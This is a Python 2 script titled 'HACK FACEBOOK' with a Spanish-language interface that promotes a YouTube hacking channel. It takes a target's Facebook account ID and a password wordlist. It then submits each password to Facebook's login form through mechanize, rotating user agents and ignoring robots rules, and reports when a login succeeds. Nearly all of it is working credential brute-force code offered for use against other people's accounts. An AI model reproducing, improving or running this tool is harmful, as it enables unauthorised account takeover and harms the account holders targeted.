#!/usr/bin/env python
# -*- coding: UTF-8 -*-
	
	
import os
import sys
import mechanize
import cookielib
import random 
import time

os.system('clear')

def runntek(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 100)

if sys.platform == "linux" or sys.platform == "linux2":
     GL = "\033[96;1m" # Blue aqua
     BB = "\033[34;1m" # Blue light
     YY = "\033[33;1m" # Yellow light
     GG = "\033[32;1m" # Green light
     WW = "\033[0;1m"  # White light
     RR = "\033[31;1m" # Blue
     CC = "\033[36;1m" # Cyan light
     B = "\033[34m"    # Blue 
     Y = "\033[33;1m"    # Yellow
     G = "\033[32m"    # Green
     W = "\033[0;1m"     # White
     R = "\033[31m"    # Blue 
     C = "\033[36;1m"    # Cyan
     rand = (BB,YY,GG,WW,RR,CC)
     P = random.choice(rand)
def cover():
    print """
    
    
    
    
     """
    runntek(WW+"           YouTube'@Ethical Tutoriales, sean bienvenidos..")
    time.sleep(1)
    print " "
    print GL+"  +============================================+"
    print RR+"  |         HACK FACEBOOK By B4rc0d37          |"
    print GL+"  +============================================+"
    print WW+"  |           Script BY: B4rc0d37              |"
    print GG+"  |        La paciencia es una virtud          |"
    print WW+"  |            FACEBOOK: B4rc0d37              |"
    print Y+ "  |              Version: 1.0                  |"
    print WW+"  |--------------------------------------------|"
    print GL+"  |          Viva el codigo PYTHON             |"
    print WW+"  |--------------------------------------------|"
    print GL+"  +============================================+"
    print GG+"  |       HACK FACEBOOK By B4rc0d37            |"
    print GL+"  +============================================+"     


cover()

email = str(raw_input(WW+" Introduzca la ID del objetivo\033[33;1m: "))

passwordlist = str(raw_input(WW+"Ingrese el archivo de Contraseñas\033[95m[ pass.txt ] \033[92;1m: "))


#login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]


def runntek(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 100)

def main():
        global br
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        welcome()
        search()
        print " "
        runntek(RR+"Desarrolla tus propios diccionarios")
        runntek(RR+"Sera mas eficaz a la hora del ataque")
        time.sleep(1)
        print WW+34*"  -"
        kol()

def kol():
    nok = raw_input("Editar lista de palabras? \033[96;1m[y/n]: ")
    if nok == "y":
        print ("Por favor escriba la orden\033[92;1m[ nano pass.txt ] !")
        print WW+(41*"-")
        print GL+(" ")
        os.sys.exit()
    else:
        exit(0)
def brute(password):
        sys.stdout.write(GG+"\r[+]\033[97;1m Probando ..... {}\n".format(password))
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr = 0)
        br.form['email'] = email
        br.form['pass'] = password
        sub = br.submit()
        log = sub.geturl()
        if log != login and (not 'login_attempt' in log):
                        print("\033[92;1m\n\n[+]\033[97;1m Password Encontrada \033[31;1m===| \033[96;1m{}".format(password)) 
                        print " "
                        raw_input(WW+"PULSE ENTER PARA SALIR.....")
                        sys.exit(1)


def search():
        global password
        passwords = open(passwordlist,"r")
        for password in passwords:
                passwords = password.replace("\n","")
                brute(password)


#welcome
def welcome():
        wel = GG+"""
No olvides suscribirte al Canal de Youtube "https://www.youtube.com/c/TutorialesHackingEtico" 
Y darle LIKE al Video.... Gracias!!!
!!!!!!!!! \033[96;4mLife Of Programmer\033[92;1m
       |_|
      """
        print wel
        print " "
        total = open(passwordlist,"r")
        total = total.readlines()
        print " "
        print GL+" [*] Cuenta a Crackear : {}".format(email)
        print RR+" [*] Cantidad :" , len(total),WW+ "passwords"
        print Y+" [*] Cracking, please wait .....\n\n"

if __name__ == '__main__':
        main()
